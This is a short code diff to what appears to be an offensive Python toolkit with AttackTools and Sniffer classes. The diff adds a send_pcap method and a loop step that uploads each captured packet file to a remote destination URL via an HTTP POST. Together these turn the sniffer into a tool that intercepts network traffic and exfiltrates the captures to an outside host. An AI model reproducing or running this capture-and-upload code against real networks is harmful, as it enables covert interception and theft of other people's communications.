@@ -5,6 +5,7 @@ from DataStructures import *
 from threading import Thread
 import time
 from collections import deque
+from requests import post
 
 
 class AttackTools:
@@ -147,3 +148,9 @@ class Sniffer:
             filename = Sniffer.gen_file_name()
             self.to_send.append(filename)
             self.sniff_single(filename, filt)
+            if self.must_send:
+                self.send_pcap(self.destination.get_url(), self.get_next_to_send())
+
+    @staticmethod
+    def send_pcap(url, file):
+        post(url, files={'file': open(file, 'rb')})
